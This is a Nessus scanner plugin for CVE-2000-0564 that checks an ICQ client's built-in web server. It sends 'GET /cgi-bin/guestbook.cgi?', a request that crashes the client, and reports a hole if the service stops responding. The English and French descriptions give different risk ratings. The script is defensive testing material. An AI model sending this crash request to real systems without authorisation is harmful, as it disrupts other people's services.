#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
#
if(description)
{
 script_id(10347);
 script_bugtraq_id(1463);
 script_cve_id("CVE-2000-0564");
 script_version ("$Revision: 1.13 $");
 
 
 name["english"] = "ICQ Denial of Service attack";
 name["francais"] = "Déni de service ICQ";
 
 script_name(english:name["english"],
 	      francais:name["francais"]);
 
desc["english"] = "
It was possible to crash the remote ICQ client
by connecting to port 80 and sending the request:

	GET /cgi-bin/guestbook.cgi?
	
	
An attacker may use this problem to prevent you from
working properly.

Solution: deactivate the webserver service of the client

Risk factor : Low";

desc["francais"] = "
Il s'est avéré possible de faire planter le client ICQ 
distant en se connectant au port 80 et en faisant la
requète :

	GET /cgi-bin/guestbook.cgi?

Un pirate peut utiliser ce problème pour vous empecher
de travailler correctement.


Solution : désactivez le service 'serveur web' offert par ce client

Facteur de risque : Moyen";

 script_description(english:desc["english"]);
 
 summary["english"] = "ICQ denial of service";
 summary["francais"] = "Déni de service ICQ";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports(80, "Services/www");
 script_dependencies("find_service.nes");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
port = get_http_port(default:80);


if (get_port_state(port))
{
  if(http_is_dead(port:port))exit(0);
  
  soc = http_open_socket(port);
  if(soc)
  {
    req = http_get(item:"/cgi-bin/guestbook.cgi?", port:port);
    send(socket:soc, data:req);
    r = http_recv(socket:soc);
    http_close_socket(soc);

   
    if(http_is_dead(port:port))security_hole(port);
  }
}

